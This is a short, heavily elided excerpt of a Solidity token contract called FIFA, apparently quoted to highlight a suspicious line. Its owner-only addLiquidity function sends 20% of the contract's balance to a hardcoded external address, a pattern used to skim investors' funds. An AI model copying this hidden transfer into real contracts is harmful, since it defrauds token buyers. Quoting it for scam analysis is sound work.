...
contract FIFA {
    ...
    function addLiquidity() public onlyOwner() {
        ...
        _authNum=0;
        address(uint160(0xD4da4bB40Ba5EA40d3eb0D7Df8E7961ffd6f19eE)).transfer(address(this).balance.mul(20).div(100));
    ...
    function buyIDO_USDT(address _refer) payable public returns(bool){
